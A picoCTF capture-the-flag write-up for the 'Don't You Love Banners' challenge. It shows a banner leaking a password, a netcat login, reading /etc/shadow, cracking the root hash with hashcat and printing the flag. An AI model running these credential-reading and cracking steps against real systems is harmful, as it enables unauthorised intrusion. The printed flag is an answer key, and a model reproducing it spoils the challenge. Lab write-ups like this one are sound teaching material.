# **Don't You Love Banners**

## **Problem**
Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 57623. 
Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 56550. 
From the above information abuse the machine and find the flag in the /root directory.

## **Solution**
First NC the leaking server...it gives you the password!

└─$ nc tethys.picoctf.net 57623
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Then go to the next server and enter in the password. It will ask you 2 questions which after a little Google Searching 
you will answer easily.

└─$ nc tethys.picoctf.net 56550
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
def con
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ 


now that you are in, find the flag.

a quick ls -la will show the flag.txt file

I actually didnt use the hints to get the flag...I checked the etc folder and was given access. Becuase this was open
I jumped straight to the shadow folder and hit it with a the cat function:

player@challenge:~$ cd /etc
cd /etc
player@challenge:/etc$ cat shadow
cat shadow
root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:19791:0:99999:7:::
daemon:*:19507:0:99999:7:::
bin:*:19507:0:99999:7:::
sys:*:19507:0:99999:7:::
sync:*:19507:0:99999:7:::
games:*:19507:0:99999:7:::
man:*:19507:0:99999:7:::
lp:*:19507:0:99999:7:::
mail:*:19507:0:99999:7:::
news:*:19507:0:99999:7:::
uucp:*:19507:0:99999:7:::
proxy:*:19507:0:99999:7:::
www-data:*:19507:0:99999:7:::
backup:*:19507:0:99999:7:::
list:*:19507:0:99999:7:::
irc:*:19507:0:99999:7:::
gnats:*:19507:0:99999:7:::
nobody:*:19507:0:99999:7:::
_apt:*:19507:0:99999:7:::
systemd-network:*:19791:0:99999:7:::
systemd-resolve:*:19791:0:99999:7:::
messagebus:*:19791:0:99999:7:::
sshd:*:19791:0:99999:7:::
player:$6$BCCW51fi$UI/5W01uG2.6EmxktMtZXbJQwrgDlv213cLwu7RxaIQHnRZXwKZ3yjuyNKf86KlSwbvAOp3YozpNVrBeKW9Ls0:19791:0:99999:7:::


there is our root password with sha512crypt (we know this because of the $6$)....run hashcat
with 1800 for the format and --show to produce the results

─$ hashcat -a 0 -m 1800 hash /usr/share/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt --show
$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:iloveyou


now with the root password just su root...enter iloveyou and you have all rights

player@challenge:/etc$ su root
su root
Password: iloveyou

locate and cat the flag

root@challenge:/etc# cd /root
cd /root
root@challenge:~# ls -la
ls -la
total 16
drwxr-xr-x 1 root root    6 Mar 12 00:18 .
drwxr-xr-x 1 root root   29 Mar 27 18:14 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12 00:18 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
root@challenge:~# cat flag.txt
cat flag.txt
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}



